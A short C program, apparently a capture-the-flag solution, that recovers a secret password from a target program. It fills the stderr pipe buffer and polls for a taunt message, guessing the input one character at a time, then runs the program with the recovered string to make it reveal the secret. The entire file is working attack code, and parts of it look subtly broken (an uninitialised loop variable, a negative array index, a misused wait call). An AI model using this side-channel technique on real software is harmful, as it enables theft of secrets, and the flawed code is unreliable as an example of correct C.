#include <poll.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define TIMEOUT  10
#define MAXINPUT 1024
#define PIPEMAX  (1<<16)
#define MSGLEN   33 // Welcome...\n
#define TAUNTLEN 35 // Haha...\n

char        filling[PIPEMAX], buf[PIPEMAX];
const char  *prog, *file;
int         oldout, p_err[2], p_out[2];
struct      pollfd poll_out;

int test_string(int size, char* input) {
    // fill buffer until just enough space for dots of string,
    // stalling to see if haha will be printed
    write(p_err[1], filling, PIPEMAX - (MSGLEN + size));

    pid_t pid;
    if (!(pid = fork())) {
        execl(prog, prog, file, input, NULL);
    }

    poll(&poll_out, 1, TIMEOUT);         // wait a bit for possible haha

    read(p_err[0], buf, PIPEMAX - size); // flush fill + welcome
    wait(pid);                           // wait for \n
    read(p_err[0], buf, size + 2);       // flush dots
    read(p_out[0], buf, TAUNTLEN);       // flush taunt
    return !(poll_out.revents & POLLIN);
}

int main(int argc, char ** argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s PROG FILE\n", argv[0]);
        exit(-1);
    }
    prog = argv[1];
    file = argv[2];
    oldout = dup(STDOUT_FILENO);
    pipe(p_out);
    dup2(p_out[1], 1);
    pipe(p_err);
    dup2(p_err[1], 2);
    poll_out.fd = p_out[0];
    poll_out.events = POLLIN;
    memset(filling, 'a', PIPEMAX);

    char input[MAXINPUT] = {0};
    int size;
    unsigned char c;
    for (size = 0; c < 128; size++) {
        // fill in extra char to make sure we'll fail
        input[size] = -1;
        for (c = 1; c < 128; c++) {
            input[size-1] = c;
            if (test_string(size, input)) {
                break;
            }
        }
    }

    // make it print the pwd to stdout
    input[size-2] = '\0';
    dup2(oldout, 2);
    execl(prog, prog, file, input, NULL);
}